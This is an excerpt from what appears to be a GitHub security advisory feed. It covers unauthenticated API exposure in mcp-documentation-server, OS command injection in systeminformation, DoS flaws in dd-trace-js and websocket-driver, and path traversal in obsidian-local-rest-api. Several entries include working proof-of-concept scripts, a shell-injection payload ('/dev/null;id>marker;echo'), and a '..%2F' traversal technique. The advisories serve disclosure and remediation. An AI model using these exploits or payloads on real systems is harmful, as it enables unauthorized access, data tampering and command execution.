<p>With Express/Node, <code>app.listen(PORT)</code> without a host argument binds to all interfaces. In my reproduction, this resulted in:</p>
<pre><code class="language-text">LISTEN 0 511 *:3080 *:* users:(("MainThread",pid=1781375,fd=21))
</code></pre>
<p>The exposed API includes document-admin operations such as:</p>
<pre><code class="language-text">GET    /api/documents
GET    /api/documents/:id
POST   /api/documents
POST   /api/search-all
DELETE /api/documents/:id
GET    /api/config
</code></pre>
<p>I did not send any <code>Authorization</code> header in the PoC requests, and all tested operations succeeded.</p>
<h3 id="poc">PoC</h3>
<p>Tested on v1.13.0.</p>
<h4 id="1-build-from-source">1. Build from source</h4>
<pre><code class="language-bash">cd ~/Desktop
mkdir -p docsrv_repro_from_scratch
cd docsrv_repro_from_scratch

git clone https://github.com/andrea9293/mcp-documentation-server.git
cd mcp-documentation-server

git rev-parse HEAD
npm install --no-audit --no-fund
npm run build

ls -l dist/server.js
node -p "require('./package.json').version"
</code></pre>
<p>Expected version:</p>
<pre><code class="language-text">1.13.0
</code></pre>
<h4 id="2-start-the-server-with-default-web-ui-behavior">2. Start the server with default Web UI behavior</h4>
<p>Do not set <code>START_WEB_UI=false</code>.</p>
<pre><code class="language-bash">rm -rf /tmp/docsrv_base
mkdir -p /tmp/docsrv_base

MCP_BASE_DIR=/tmp/docsrv_base \
WEB_PORT=3080 \
node dist/server.js \
  &lt;/dev/null \
  &gt;/tmp/docsrv_stdout.log \
  2&gt;/tmp/docsrv_stderr.log &amp;

DOCSRV_PID=$!
sleep 5

echo "DOCSRV_PID=$DOCSRV_PID"
ps -p "$DOCSRV_PID" -o pid,stat,cmd
</code></pre>
<h4 id="3-confirm-that-the-web-uiapi-binds-to-all-interfaces">3. Confirm that the Web UI/API binds to all interfaces</h4>
<pre><code class="language-bash">ss -ltnp | grep ':3080' || true
</code></pre>
<p>Observed:</p>
<pre><code class="language-text">LISTEN 0 511 *:3080 *:* users:(("MainThread",pid=1781375,fd=21))
</code></pre>
<p>This indicates the service is not bound only to <code>127.0.0.1</code>.</p>
<h4 id="4-confirm-that-the-api-is-reachable-through-the-lan-ip">4. Confirm that the API is reachable through the LAN IP</h4>
<pre><code class="language-bash">LAN_IP=$(hostname -I | awk '{print $1}')
echo "LAN_IP=$LAN_IP"

curl -sS --max-time 5 "http://$LAN_IP:3080/api/config"
echo
</code></pre>
<p>Observed:</p>
<pre><code class="language-text">LAN_IP=10.0.250.230
{"gemini_available":false,"embedding_model":"Xenova/all-MiniLM-L6-v2"}
</code></pre>
<p>No authentication header was sent.</p>
<h4 id="5-full-unauthenticated-document-admin-poc">5. Full unauthenticated document-admin PoC</h4>
<pre><code class="language-bash">cat &gt; /tmp/docsrv_unauth_poc.py &lt;&lt;'PY'
#!/usr/bin/env python3
import json
import sys
import urllib.request
import urllib.error

HOST = sys.argv[1] if len(sys.argv) &gt; 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 3080
BASE = f"http://{HOST}:{PORT}"

def req(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    headers = {"Content-Type": "application/json"} if body is not None else {}
    r = urllib.request.Request(f"{BASE}{path}", data=data, method=method, headers=headers)
    with urllib.request.urlopen(r, timeout=10) as resp:
        raw = resp.read().decode()
        try:
            return resp.status, json.loads(raw or "null")
        except Exception:
            return resp.status, raw

def main():
    print(f"[poc] target = {BASE}")
    print("[poc] no Authorization header is sent")

    status, config = req("GET", "/api/config")
    print(f"[0] config: HTTP {status}, {config}")

    status, docs = req("GET", "/api/documents")
    print(f"[1] list documents: HTTP {status}, count={len(docs) if isinstance(docs, list) else 'unknown'}")

    marker = "ATTACKER_CONTROLLED_DOCUMENT_MARKER_unauth_network_api"
    body = {
        "title": "network-inserted-test-document",
        "content": marker + "\nThis document was inserted through the unauthenticated network API.",
        "metadata": {"source": "unauth-network-poc"}
    }

    status, added = req("POST", "/api/documents", body)
    print(f"[2] add document: HTTP {status}, response={added}")

    doc_id = None
    if isinstance(added, dict):
        doc_id = added.get("id") or added.get("document", {}).get("id")

    if not doc_id:
        status, docs = req("GET", "/api/documents")
        for d in docs:
            if d.get("title") == "network-inserted-test-document":
                doc_id = d.get("id")
                break

    if not doc_id:
        raise RuntimeError("could not locate inserted document id")

    print(f"[2] inserted id={doc_id}")

    status, doc = req("GET", f"/api/documents/{doc_id}")
    content = doc.get("content", "") if isinstance(doc, dict) else str(doc)
    print(f"[3] read document: HTTP {status}, marker_present={marker in content}")

    status, hits = req("POST", "/api/search-all", {
        "query": "ATTACKER_CONTROLLED_DOCUMENT_MARKER network inserted",
        "limit": 5
    })
    print(f"[4] search-all: HTTP {status}, response_prefix={str(hits)[:300]!r}")

    status, deleted = req("DELETE", f"/api/documents/{doc_id}")
    print(f"[5] delete document: HTTP {status}, response={deleted}")

    print("[poc] DONE")

if __name__ == "__main__":
    main()
PY

chmod +x /tmp/docsrv_unauth_poc.py
</code></pre>
<p>Run against localhost:</p>
<pre><code class="language-bash">python3 /tmp/docsrv_unauth_poc.py 127.0.0.1 3080
</code></pre>
<p>Observed:</p>
<pre><code class="language-text">[poc] target = http://127.0.0.1:3080
[poc] no Authorization header is sent
[0] config: HTTP 200, {'gemini_available': False, 'embedding_model': 'Xenova/all-MiniLM-L6-v2'}
[1] list documents: HTTP 200, count=0
[2] add document: HTTP 200, response={'id': 'ef13280d7441d5bb', 'title': 'network-inserted-test-document', 'message': 'Document added successfully'}
[2] inserted id=ef13280d7441d5bb
[3] read document: HTTP 200, marker_present=True
[4] search-all: HTTP 200, response_prefix="[{'document_id': 'ef13280d7441d5bb', 'parent_index': 0, 'score': 1, 'content': 'ATTACKER_CONTROLLED_DOCUMENT_MARKER_unauth_network_api\\nThis document was inserted through the unauthenticated network API.'}]"
[5] delete document: HTTP 200, response={'success': True, 'message': 'Document "network-inserted-test-document" deleted'}
[poc] DONE
</code></pre>
<p>Run the same PoC against the host's LAN IP:</p>
<pre><code class="language-bash">LAN_IP=$(hostname -I | awk '{print $1}')
python3 /tmp/docsrv_unauth_poc.py "$LAN_IP" 3080
</code></pre>
<p>Observed:</p>
<pre><code class="language-text">[poc] target = http://10.0.250.230:3080
[poc] no Authorization header is sent
[0] config: HTTP 200, {'gemini_available': False, 'embedding_model': 'Xenova/all-MiniLM-L6-v2'}
[1] list documents: HTTP 200, count=0
[2] add document: HTTP 200, response={'id': 'ef13280d7441d5bb', 'title': 'network-inserted-test-document', 'message': 'Document added successfully'}
[2] inserted id=ef13280d7441d5bb
[3] read document: HTTP 200, marker_present=True
[4] search-all: HTTP 200, response_prefix="[{'document_id': 'ef13280d7441d5bb', 'parent_index': 0, 'score': 1, 'content': 'ATTACKER_CONTROLLED_DOCUMENT_MARKER_unauth_network_api\\nThis document was inserted through the unauthenticated network API.'}]"
[5] delete document: HTTP 200, response={'success': True, 'message': 'Document "network-inserted-test-document" deleted'}
[poc] DONE
</code></pre>
<h4 id="6-cleanup">6. Cleanup</h4>
<pre><code class="language-bash">kill "$DOCSRV_PID" 2&gt;/dev/null || true
fuser -k 3080/tcp 2&gt;/dev/null || true
rm -rf /tmp/docsrv_base
rm -f /tmp/docsrv_unauth_poc.py
rm -f /tmp/docsrv_stdout.log /tmp/docsrv_stderr.log
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a missing-authentication and unsafe-default network exposure issue for the Web UI/API.</p>
<p>A network-reachable attacker can access the document-management API without credentials. Depending on what the user stores in the documentation server, this may allow:</p>
<ul>
<li>reading document titles, previews, and full document contents;</li>
<li>searching across the entire document corpus;</li>
<li>inserting attacker-controlled documents into the corpus;</li>
<li>deleting documents;</li>
<li>tampering with the user's local knowledge base used by the MCP assistant.</li>
</ul>
<p>This can affect users who run the MCP server on laptops, workstations, dev VMs, or hosts connected to shared networks, VPNs, Docker bridges, or other routable local networks.</p>
<p>This is not a claim for unauthenticated remote code execution. The issue is that the documented Web UI/API is exposed on all interfaces by default and does not require authentication for document-admin operations.</p>
<p>A safer default would be to bind the Web UI/API to <code>127.0.0.1</code> by default, and require an explicit opt-in such as <code>WEB_BIND_HOST=0.0.0.0</code> for network exposure. If network binding is supported, an authentication token should be required for document-management endpoints.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/andrea9293/mcp-documentation-server/security/advisories/GHSA-6f5r-5672-72j7">https://github.com/andrea9293/mcp-documentation-server/security/advisories/GHSA-6f5r-5672-72j7</a></li>
<li><a href="https://github.com/andrea9293/mcp-documentation-server/commit/37159d4e06b8ee50c3645b2496e3d3f6d32c47f9">https://github.com/andrea9293/mcp-documentation-server/commit/37159d4e06b8ee50c3645b2496e3d3f6d32c47f9</a></li>
<li><a href="https://github.com/andrea9293/mcp-documentation-server/releases/tag/v1.13.1">https://github.com/andrea9293/mcp-documentation-server/releases/tag/v1.13.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6f5r-5672-72j7">https://github.com/advisories/GHSA-6f5r-5672-72j7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6f5r-5672-72j7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-15T23:26:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[systeminformation] systeminformation: OS command injection in networkInterfaces() via interfaces(5) source-directive path on Linux]]></title>
        <id>https://github.com/advisories/GHSA-5xpp-75jx-m839</id>
        <link href="https://github.com/advisories/GHSA-5xpp-75jx-m839"/>
        <updated>2026-07-15T23:09:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>On Linux, <code>systeminformation</code>'s <code>networkInterfaces()</code> is vulnerable to OS command injection through the Debian/Ubuntu <code>interfaces(5)</code> <code>source</code> directive. While collecting per-interface DHCP state, the library reads <code>/etc/network/interfaces</code> and, for every <code>source &lt;path&gt;</code> line it encounters, extracts the path token <em>from the file content</em> and interpolates it <strong>unquoted</strong> into a shell command string that is run via <code>execSync()</code>. A <code>source</code> line whose path contains shell metacharacters executes arbitrary commands with the privileges of the calling Node.js process.</p>
<p>This is the same root-cause class as the previously-fixed NetworkManager-connection-name injection in this file: a value parsed out of local system state is re-interpolated into a shell command string without sanitization. The NetworkManager paths were converted to argument-array execution, but the <code>interfaces(5)</code> <code>source</code>-recursion sink in <code>checkLinuxDCHPInterfaces()</code> was left unfixed and still builds a shell string. The input to this sink is <em>unsanitized</em> (unlike the <code>iface</code>/<code>connectionName</code> paths, which pass through <code>util.sanitizeString</code> in strict mode before reaching their commands).</p>
<h3 id="impact">Impact</h3>
<p>An attacker who can place or influence a <code>source</code>d path in <code>/etc/network/interfaces</code> (or any file it transitively <code>source</code>s) achieves command execution inside any process that calls <code>networkInterfaces()</code>. Realistic affected deployments are the same ones that motivate this library:</p>
<ul>
<li>local inventory / asset agents</li>
<li>monitoring and diagnostics agents</li>
<li>admin-dashboard backends collecting host information</li>
<li>device-management / desktop agents</li>
</ul>
<p>If such a process runs with elevated privileges, the injected command runs with those privileges. <code>networkInterfaces()</code> is a core, frequently-called API and is reached transitively by <code>getStaticData()</code> / <code>getAllData()</code>, so the sink is exercised by ordinary usage on Linux.</p>
<h3 id="threat-model">Threat model</h3>
<p>The dangerous value is <strong>not</strong> a function argument supplied by the caller. It is read from the <em>content</em> of an <code>interfaces(5)</code> configuration file. The stock Debian/Ubuntu layout uses <code>source /etc/network/interfaces.d/*</code> and <code>source-directory</code> fan-out, so the parser routinely follows <code>source</code> directives into other files and re-parses their <code>source</code> lines. Any actor who can write a file that becomes reachable through that <code>source</code> chain — for example a lower-privileged process or configuration-management hook that drops a file into a <code>source</code>d directory, or a tool that materializes an interfaces snippet from semi-trusted input — controls the path token that lands in the shell command. No NetworkManager activation or special hardware is required; the only precondition is that one <code>source</code>d path string contains shell metacharacters.</p>
<h3 id="vulnerable-code">Vulnerable code</h3>
<p><code>lib/network.js</code>, <code>checkLinuxDCHPInterfaces()</code> (current <code>5.31.6</code> line numbers):</p>
<pre><code class="language-js">// lib/network.js
function checkLinuxDCHPInterfaces(file) {
  let result = [];
  try {
    const cmd = `cat ${file} 2&gt; /dev/null | grep 'iface\\|source'`;   // &lt;-- unquoted ${file} -&gt; shell sink
    const lines = execSync(cmd, util.execOptsLinux).toString().split('\n');

    lines.forEach((line) =&gt; {
      const parts = line.replace(/\s+/g, ' ').trim().split(' ');
      if (parts.length &gt;= 4) {
        if (line.toLowerCase().indexOf(' inet ') &gt;= 0 &amp;&amp; line.toLowerCase().indexOf('dhcp') &gt;= 0) {
          result.push(parts[1]);
        }
      }
      if (line.toLowerCase().includes('source')) {
        const file = line.split(' ')[1];                              // &lt;-- path parsed FROM file content
        result = result.concat(checkLinuxDCHPInterfaces(file));        // &lt;-- recurses, re-feeding attacker path
      }
    });
  } catch {
    util.noop();
  }
  return result;
}
</code></pre>
<p><code>util.execOptsLinux</code> sets no <code>shell</code> option, so <code>execSync(cmd, util.execOptsLinux)</code> runs <code>cmd</code> through <code>/bin/sh</code>. The <code>${file}</code> token is interpolated raw — not quoted, not passed through <code>util.sanitizeString</code>/<code>sanitizeShellString</code> — so <code>;</code>, <code>$( )</code>, backticks, <code>|</code>, <code>&amp;</code>, redirections, and even a bare space all break out of the intended <code>cat</code>/<code>grep</code> pipeline.</p>
<p>Reach chain to the public API:</p>
<pre><code class="language-js">// lib/network.js, getLinuxDHCPNics()
result = checkLinuxDCHPInterfaces('/etc/network/interfaces');
</code></pre>
<pre><code class="language-js">// lib/network.js, networkInterfaces() (Linux branch)
_dhcpNics = getLinuxDHCPNics();
</code></pre>
<p><code>networkInterfaces()</code> is also reached by <code>getStaticData()</code> and <code>getAllData()</code> in <code>lib/index.js</code>.</p>
<h3 id="reproduction">Reproduction</h3>
<p>The PoC exercises the <strong>verbatim shipped sink function</strong> extracted from the installed <code>node_modules/systeminformation/lib/network.js</code> (version pinned to <code>5.31.6</code>), bound to the same <code>child_process.execSync</code> and shipped <code>util.execOptsLinux</code> the library uses. It then drives the exact <code>source</code>-recursion data flow with a malicious sourced path. A negative control with a benign path confirms no execution occurs on well-formed input.</p>
<p>Install the pinned vulnerable version:</p>
<pre><code class="language-bash">mkdir si-poc &amp;&amp; cd si-poc
npm init -y &gt;/dev/null
npm install systeminformation@5.31.6
</code></pre>
<p><code>poc.js</code>:</p>
<pre><code class="language-js">const fs = require('fs');
const path = require('path');
const cp = require('child_process');
const libDir = path.join(__dirname, 'node_modules', 'systeminformation', 'lib');
const util = require(path.join(libDir, 'util.js'));

// Load the VERBATIM shipped sink function from the installed library source.
const src = fs.readFileSync(path.join(libDir, 'network.js'), 'utf8');
const m = src.match(/function checkLinuxDCHPInterfaces\(file\) \{[\s\S]*?\n\}\n/);
if (!m) { console.error('could not locate shipped function'); process.exit(2); }

// Bind the same free vars network.js binds: execSync + util.
const execSync = cp.execSync;
const checkLinuxDCHPInterfaces =
  new Function('execSync', 'util', m[0] + '\nreturn checkLinuxDCHPInterfaces;')(execSync, util);

// --- Malicious case: a sourced interfaces file with shell metacharacters in the path ---
const tmp = fs.mkdtempSync('/tmp/si-dhcp-');
const outer = path.join(tmp, 'interfaces');
const marker = path.join(tmp, 'PWNED');
const maliciousSource = `/dev/null;id&gt;${marker};echo`;
fs.writeFileSync(outer, `auto lo\niface lo inet loopback\nsource ${maliciousSource}\n`);

console.log('PRE  marker_exists=' + fs.existsSync(marker));
const res = checkLinuxDCHPInterfaces(outer);   // == networkInterfaces() -&gt; getLinuxDHCPNics() path
console.log('returned=' + JSON.stringify(res));
console.log('POST marker_exists=' + fs.existsSync(marker));
if (fs.existsSync(marker)) console.log('marker_contents=' + fs.readFileSync(marker, 'utf8').trim());

// --- Negative control: a benign sourced path must NOT execute anything ---
const tmp2 = fs.mkdtempSync('/tmp/si-neg-');
const outer2 = path.join(tmp2, 'interfaces');
const inner2 = path.join(tmp2, 'iface.d');
const marker2 = path.join(tmp2, 'PWNED_NEG');
fs.writeFileSync(inner2, 'iface eth0 inet dhcp\n');
fs.writeFileSync(outer2, `auto lo\nsource ${inner2}\n`);
console.log('\nNEG pre  marker_exists=' + fs.existsSync(marker2));
const res2 = checkLinuxDCHPInterfaces(outer2);
console.log('NEG returned=' + JSON.stringify(res2));
console.log('NEG post marker_exists=' + fs.existsSync(marker2));
</code></pre>
<p>Run it:</p>
<pre><code class="language-bash">node poc.js
</code></pre>
<p>Verbatim captured output (against <code>systeminformation@5.31.6</code>):</p>
<pre><code>PRE  marker_exists=false
returned=[]
POST marker_exists=true
marker_contents=uid=501(rick) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh),400(com.apple.access_remote_ae)

NEG pre  marker_exists=false
NEG returned=["eth0"]
NEG post marker_exists=false
</code></pre>
<p>The malicious <code>source</code> path caused the injected <code>id</code> command to run (marker created, contents = the calling process identity), while the benign <code>source</code> path parsed normally (<code>["eth0"]</code>) and produced no marker. The injected command runs with the privileges of the Node.js process that called <code>networkInterfaces()</code>.</p>
<h3 id="end-to-end-reproduction">End-to-end reproduction</h3>
<p>The transcript above is the end-to-end run against the pinned published artifact <code>systeminformation@5.31.6</code>, loading the shipped <code>lib/network.js</code> and <code>lib/util.js</code> from <code>node_modules</code>. Exact commands:</p>
<pre><code class="language-bash">mkdir si-poc &amp;&amp; cd si-poc
npm init -y &gt;/dev/null
npm install systeminformation@5.31.6
# place poc.js (from the Reproduction section) in this directory
node poc.js
</code></pre>
<p>The marker file <code>PWNED</code> is created only by the injected command path; the negative-control marker <code>PWNED_NEG</code> is never created. The verbatim captured stdout is shown in the Reproduction section above.</p>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Stop building a shell string from a path that comes out of file content. Read the file with <code>fs</code> (no shell), or use argument-array execution, and never interpolate a parsed <code>source</code> path into a shell command. For example:</p>
<pre><code class="language-js">function checkLinuxDCHPInterfaces(file) {
  let result = [];
  try {
    // No shell: read the file directly and filter in JS.
    const content = require('fs').readFileSync(file, { encoding: 'utf8' });
    const lines = content.split('\n').filter((l) =&gt; /iface|source/.test(l));
    lines.forEach((line) =&gt; {
      const parts = line.replace(/\s+/g, ' ').trim().split(' ');
      if (parts.length &gt;= 4 &amp;&amp;
          line.toLowerCase().indexOf(' inet ') &gt;= 0 &amp;&amp;
          line.toLowerCase().indexOf('dhcp') &gt;= 0) {
        result.push(parts[1]);
      }
      if (line.toLowerCase().includes('source')) {
        const sourced = line.split(' ')[1];
        result = result.concat(checkLinuxDCHPInterfaces(sourced));
      }
    });
  } catch {
    require('./util').noop();
  }
  return result;
}
</code></pre>
<p>If shelling out is preferred, replace the <code>cat</code>/<code>grep</code> shell string with argument-array execution as shown below, so the path is passed as a single argv element and the shell never re-parses it:</p>
<pre><code class="language-js">const { execFileSync } = require('child_process');
const content = execFileSync('cat', [file], util.execOptsLinux).toString();
</code></pre>
<p>Quoting alone is insufficient. Treat every value parsed from <code>interfaces(5)</code> files as untrusted even though it originates from local system state, consistent with the defensive <code>util.sanitizeString</code> pattern already applied to the interface name and NetworkManager connection name on the sibling paths.</p>
<h3 id="fix-pr">Fix PR</h3>
<p>A fix is provided on a private temporary fork (not pushed to any public fork during the embargo). The branch replaces the <code>cat ${file}</code> shell string in <code>checkLinuxDCHPInterfaces()</code> with a non-shell <code>fs.readFileSync</code> read and adds a Linux regression test that points the function at an <code>interfaces</code> file containing a <code>source</code> directive with shell metacharacters and asserts that no side-effect command runs (no marker file is produced) while a benign sourced DHCP interface is still parsed.</p>
<h3 id="credit">Credit</h3>
<p>Reported by tonghuaroot.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839">https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-5xpp-75jx-m839</a></li>
<li><a href="https://github.com/sebhildebrandt/systeminformation/commit/bbfddde48672d0ee124fefdb3cb4442fd9dd4f03">https://github.com/sebhildebrandt/systeminformation/commit/bbfddde48672d0ee124fefdb3cb4442fd9dd4f03</a></li>
<li><a href="https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.31.7">https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.31.7</a></li>
<li><a href="https://github.com/advisories/GHSA-5xpp-75jx-m839">https://github.com/advisories/GHSA-5xpp-75jx-m839</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5xpp-75jx-m839</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-15T23:09:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dd-trace] dd-trace-js: Improper parsing of W3C baggage headers may lead to DoS]]></title>
        <id>https://github.com/advisories/GHSA-wxqq-gcq8-c443</id>
        <link href="https://github.com/advisories/GHSA-wxqq-gcq8-c443"/>
        <updated>2026-07-15T22:58:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Datadog tracing libraries that implement W3C baggage propagation parse incoming baggage HTTP headers without enforcing item-count or byte-size limits on the extract path. The DD_TRACE_BAGGAGE_MAX_ITEMS (default 64) and DD_TRACE_BAGGAGE_MAX_BYTES (default 8192) limits were applied only to baggage injection, not extraction. A remote, unauthenticated attacker can send a request whose baggage header contains an arbitrarily large number of comma-separated key-value pairs (or a single very large value). The tracer allocates a hash-map entry for each pair on every request, causing unbounded CPU and memory consumption and enabling a remote Denial of Service against any HTTP service that has the baggage propagation style enabled.
The baggage propagation style is enabled by default in most affected tracers, so any internet-facing service that has been instrumented with an affected tracer version is exposed unless the propagation style has been explicitly narrowed.</p>
<h3 id="patches">Patches</h3>
<p>This is resolved in version 5.100.0 and later of the <code>dd-trace-js</code> library.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If users cannot upgrade immediately:</p>
<ol>
<li>Disable <code>baggage</code> extraction by removing <code>baggage</code> from <code>DD_TRACE_PROPAGATION_STYLE</code> (or <code>DD_TRACE_PROPAGATION_STYLE_EXTRACT</code> if set independently).</li>
<li>Cap the maximum HTTP request header size at an upstream proxy or web server (for example, Apache <code>LimitRequestFieldSize</code>, Nginx <code>large_client_header_buffers</code>, Envoy <code>max_request_headers_kb</code>).</li>
</ol>
<h3 id="resources">Resources</h3>
<p>Related upstream advisories:
<a href="https://github.com/open-telemetry/opentelemetry-go/security/advisories/GHSA-mh2q-q3fh-2475">opentelemetry-go GHSA-mh2q-q3fh-2475</a>
<a href="https://github.com/open-telemetry/opentelemetry-dotnet/security/advisories/GHSA-g94r-2vxg-569j">opentelemetry-dotnet GHSA-g94r-2vxg-569j</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/DataDog/dd-trace-js/security/advisories/GHSA-wxqq-gcq8-c443">https://github.com/DataDog/dd-trace-js/security/advisories/GHSA-wxqq-gcq8-c443</a></li>
<li><a href="https://github.com/advisories/GHSA-wxqq-gcq8-c443">https://github.com/advisories/GHSA-wxqq-gcq8-c443</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wxqq-gcq8-c443</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-15T22:58:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[websocket-driver] websocket-driver: Resource limit bypass via message compression]]></title>
        <id>https://github.com/advisories/GHSA-mp7j-qc5w-4988</id>
        <link href="https://github.com/advisories/GHSA-mp7j-qc5w-4988"/>
        <updated>2026-07-15T22:08:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If this library is used in tandem with the <code>permessage-deflate</code> extension, a WebSocket server or client can be made to accept messages that are larger than the configured maximum message size. This is because this limit is checked against the message frames' length headers, which give the size of the compressed data, not the size after decompression. This can lead to applications accepting larger messages than expected and exceeding their intended resource usage.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been patched in version 0.7.5, by checking the length of messages after they are processed by incoming extensions. All users should upgrade to this version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No known workarounds exist.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>This issue was discovered and reported by Pranjali Thakur, DepthFirst Security Research Team.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/faye/websocket-driver-node/security/advisories/GHSA-mp7j-qc5w-4988">https://github.com/faye/websocket-driver-node/security/advisories/GHSA-mp7j-qc5w-4988</a></li>
<li><a href="https://github.com/faye/websocket-driver-node/releases/tag/0.7.5">https://github.com/faye/websocket-driver-node/releases/tag/0.7.5</a></li>
<li><a href="https://github.com/advisories/GHSA-mp7j-qc5w-4988">https://github.com/advisories/GHSA-mp7j-qc5w-4988</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mp7j-qc5w-4988</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-15T22:08:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[websocket-driver] websocket-driver: Message corruption via abuse of protocol length headers]]></title>
        <id>https://github.com/advisories/GHSA-xv26-6w52-cph6</id>
        <link href="https://github.com/advisories/GHSA-xv26-6w52-cph6"/>
        <updated>2026-07-15T22:07:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The frame format in draft versions of the WebSocket protocol includes a length header that allows an arbitrarily large integer to be encoded as a sequence of bytes with the high bit set. By sending an indefinite sequence of bytes with values <code>0x80</code> or above, a client can make the server parse these bytes into an ever-growing integer. Since JavaScript numbers are 64-bit floating point values, this number will eventually lose precision and lead to the subsequent payload being parsed incorrectly.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been patched in version 0.7.5 by rejecting the message if the length header exceeds the configured maximum message length. All users should upgrade to this version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No known workarounds exist.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>This issue was discovered and reported by Pranjali Thakur, DepthFirst Security Research Team.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/faye/websocket-driver-node/security/advisories/GHSA-xv26-6w52-cph6">https://github.com/faye/websocket-driver-node/security/advisories/GHSA-xv26-6w52-cph6</a></li>
<li><a href="https://github.com/faye/websocket-driver-node/releases/tag/0.7.5">https://github.com/faye/websocket-driver-node/releases/tag/0.7.5</a></li>
<li><a href="https://github.com/advisories/GHSA-xv26-6w52-cph6">https://github.com/advisories/GHSA-xv26-6w52-cph6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xv26-6w52-cph6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-15T22:07:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[obsidian-local-rest-api] obsidian-local-rest-api: Authenticated path traversal via URL-encoded %2F in /vault/{path} — arbitrary host file read/write/delete]]></title>
        <id>https://github.com/advisories/GHSA-62gx-5q78-wrvx</id>
        <link href="https://github.com/advisories/GHSA-62gx-5q78-wrvx"/>
        <updated>2026-07-15T21:56:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Local REST API's <code>/vault/{path}</code> endpoints (GET/PUT/PATCH/POST/DELETE) percent-decode the request path <em>inside the handler — after</em> Express has already routed and normalized it, then hand it to the Obsidian vault adapter with no confinement check. A literal <code>../</code> is resolved/rejected at the routing layer (→ 404), but <code>%2F</code> is not a separator there, so <code>..%2F..%2F</code> survives routing and is only turned into a real <code>/</code> by the handler's <code>decodeURIComponent</code>, reconstituting a <code>../</code> traversal that walks out of the vault. An <strong>authenticated</strong> client can read, write, or delete <strong>arbitrary files on the host</strong> with the Obsidian process's privileges.</p>
<h3 id="details">Details</h3>
<p><strong>Framework:</strong> Express (<code>import express from "express"</code>; routes registered via <code>this.api.route("/vault/*")…</code>).</p>
<p><strong>The vulnerable line</strong> — in <code>src/requestHandler.ts</code>, every vault handler (<code>vaultGet</code>, <code>vaultPut</code>, <code>vaultPatch</code>, <code>vaultPost</code>, <code>vaultDelete</code>) derives the path like this:</p>
<pre><code class="language-ts">const rawPath = decodeURIComponent(
  req.path.slice(req.path.indexOf("/", 1) + 1),
);
</code></pre>
<p>The path is <code>decodeURIComponent</code>'d <strong>after</strong> Express routing. A literal <code>../</code> is collapsed/rejected at the routing layer, but <code>%2F</code> isn't a separator there — so <code>..%2F..%2F</code> reaches the handler intact and this <code>decodeURIComponent</code> turns it into a real <code>../../</code>. <strong>The string routing saw (<code>…%2F…</code>) is not the string the handler uses (<code>…/…</code>)</strong>, and <code>%2e%2e</code> behaves the same way.</p>
<p><strong>No confinement on the decoded path.</strong> The handlers pass <code>rawPath</code> straight to the vault adapter — e.g. <code>this.app.vault.adapter.readBinary(filePath)</code> / <code>this.app.vault.getAbstractFileByPath(filePath)</code> — with no <code>path.resolve</code> + vault-root prefix check, so the reconstituted <code>../../</code> escapes.</p>
<p><strong>The fix already exists in your code — for MOVE only.</strong> <code>vaultMove</code> confines correctly:</p>
<pre><code class="language-ts">const syntheticRoot = "/vault";
const resolved = posix.resolve(syntheticRoot, normalized);
if (resolved !== syntheticRoot &amp;&amp; !resolved.startsWith(syntheticRoot + "/")) {
  this.returnCannedResponse(res, { errorCode: ErrorCode.PathTraversalNotAllowed });
  return;
}
</code></pre>
